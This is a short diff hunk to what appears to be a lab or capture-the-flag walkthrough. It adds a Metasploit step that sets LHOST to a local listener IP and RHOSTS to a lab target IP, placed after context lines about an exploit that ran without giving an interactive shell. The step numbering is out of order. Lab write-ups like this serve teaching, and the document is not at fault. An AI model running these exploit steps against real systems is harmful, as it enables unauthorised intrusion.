@@ -85,6 +85,16 @@ The exploit ran successfully but did not give me an interactive shell. Because o
 use 0
 ```
 ---
+![metasploit](images/metasploit_framework/meta6.png)
+---
+### step 8: set the LHOST: local IP and RHOSTS: target IP.
+```
+set LHOST 10.10.14.70
+```
+```
+set RHOSTS 10.129.2.141
+```
+---
 
 
 ### step2:since we had startted our target machine lets try and access the chatbot via the browser
